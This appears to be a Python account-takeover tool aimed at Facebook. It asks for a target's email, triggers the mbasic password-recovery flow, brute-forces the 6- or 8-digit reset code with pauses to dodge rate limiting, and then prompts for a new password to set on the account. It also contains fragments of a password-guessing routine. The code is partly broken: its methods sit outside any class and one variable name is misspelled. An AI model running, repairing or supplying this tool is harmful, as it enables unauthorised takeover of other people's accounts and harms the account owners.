import itertools
import sys
from time import sleep
from bs4 import BeautifulSoup
import requests
import mechanize
import os
CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 

LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'

def __init__(self):
    self.browser = self.setup_browser()

def setup_browser(self):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', MOZILLA_UAS)]
    browser.set_handle_refresh(False)
    return browser

def send_login(self, email, password):
    self.browser.open(self.LOGIN_URL)
    self.browser.select_form(nr=0)
    self.browser.form['email'] = email
    self.browser.form['pass'] = password
    return self.browser.submit().read()

def try_password(self, email, password):
    print ('Trying %s' % password)
    data = self.send_login(email, password)

    if self.is_too_often(data):
        print ('Facebook says we\'re trying too often. Waiting 30 seconds.')
        sleep(30)
        self.try_password(password)

    if self.is_logged_in(data):
        print ('Password found: %s' % password )
        sys.exit()
os.system('clear')
soup = BeautifulSoup()
email = input('Email address or username to attack:')
redo = 0
reset = 999999
newpass = soup.find(string="poop")
test = newpass
"""password = input('Password:')"""
while newpass == test:
  browser = mechanize.Browser()
  browser.set_handle_robots(False)
  cookies = mechanize.CookieJar()
  browser.set_cookiejar(cookies)
  browser.addheaders = [('User-agent', MOZILLA_UAS)]
  browser.set_handle_refresh(False)
  browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
  browser.select_form(nr=0)
  browser.form['email'] = email
  browser.submit()
  """selection confirmation"""
  browser.select_form(nr=0)
  browser.submit()
  browser.select_form(nr=0)
  browser.submit()
  browser.select_form(nr=0)
  browser.submit()
  """reset code input"""  
  response1 = browser.response()
  soup = BeautifulSoup(response1, 'html.parser')
  poptart = soup.find(string="n")
  while poptart == test:
    browser.close()
    browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
    browser.select_form(nr=0)
    browser.form['email'] = email
    browser.submit()
    """selection confirmation"""
    browser.select_form(nr=0)
    browser.submit()
    browser.select_form(nr=0)
    browser.submit()
    browser.select_form(nr=0)
    browser.submit()
    browser.select_form(nr=0)
    response1 = browser.response()
    soup = BeautifulSoup(response1, 'html.parser')
    poptart = soup.find(string="n")
    print("|", end='\r')
    print("-", end='\r')
    browser.close()
    sleep(30)
  browser.select_form(nr=0)
  """reset = input('Code: ')"""
  browser.form['n'] = reset
  browser.submit()
  response1 = browser.response()
  soup = BeautifulSoup(response1, 'html.parser')
  test = soup.find(string="poop")
  check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
  check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
  check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
  check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
  if check1 != test and redo != 1:
    print(check1)
    reset = 999999
  elif check2 != test and redo != 1:
    print(check2)
    reset = 99999999
  if check1 != test:
    while check1 != test or reset > 999999:  
      browser.select_form(nr=0)
      y = reset
      browser.form['n'] = str(y)
      browser.submit()
      print(str(reset), end='\r')
      fail = (str(y), "failed")
      succeed = (str(y), "succeded")
      s = " "
      reset = reset-1
      response1 = browser.response()
      soup = BeautifulSoup(response1, 'html.parser')
      check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
      if check1 == check3:
        print(s.join(fail))
        sleep(30)
      else:
        print(s.join(succeeed))
  elif check2 != test:
    while check2 != test or reset > 99999999:
      browser.select_form(nr=0)
      y = reset
      browser.form['n'] = str(y)
      browser.submit()
      print(str(reset), end='\r')
      fail = (str(y), "failed")
      succeed = (str(y), "succeded")
      s = " "
      reset = reset-1
      response1 = browser.response()
      soup = BeautifulSoup(response1, 'html.parser')
      check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
      if check2 == check4:
        print(s.join(fail))
        sleep(30)
      else:
        print(s.join(succeeed))
  else:
    response1 = browser.response()
    soup = BeautifulSoup(response1, 'html.parser')
    print(soup.find(string="password_new"))
    yes = input('Continue/Exit? ')
    if yes == 'n':
      exit()
    else:
      newpass = soup.find(string="password_new")
      new = input('New Password: ')
      browser.select_form(nr=0)
      browser.form['password_new'] = new
    """browser.form['n'] = x"""
  redo = 1
  browser.close()

